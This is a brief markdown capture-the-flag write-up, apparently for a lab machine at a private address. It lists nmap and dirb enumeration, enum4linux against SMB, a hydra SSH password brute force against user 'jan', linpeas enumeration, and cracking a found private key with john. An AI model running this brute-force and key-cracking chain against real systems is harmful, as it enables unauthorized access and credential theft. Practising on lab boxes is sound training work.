ip = "10.10.209.40"

# scanning 
nmap -sC -sV 10.10.209.40
open ports
```
22 
80
139
445
8080
```

port 80 directory enum
```
dirb http://10.10.209.40
- found /development
```

enumerating SMB 445
```
enum4linux -a 10.10.209.40
- return info about password strength and complexity
- two usernames

```
![img](./images/basic/img1.png)

password cracking
```
hydra -l jan -P path/wordlistt ssh://10.10.209.40

```
![img](./images/basic/img2.png)

ssh jan@10.10.209.40 

linepeas enumeration
- id rsa private key
- decryption with john

![image](./images/basic/img3.png)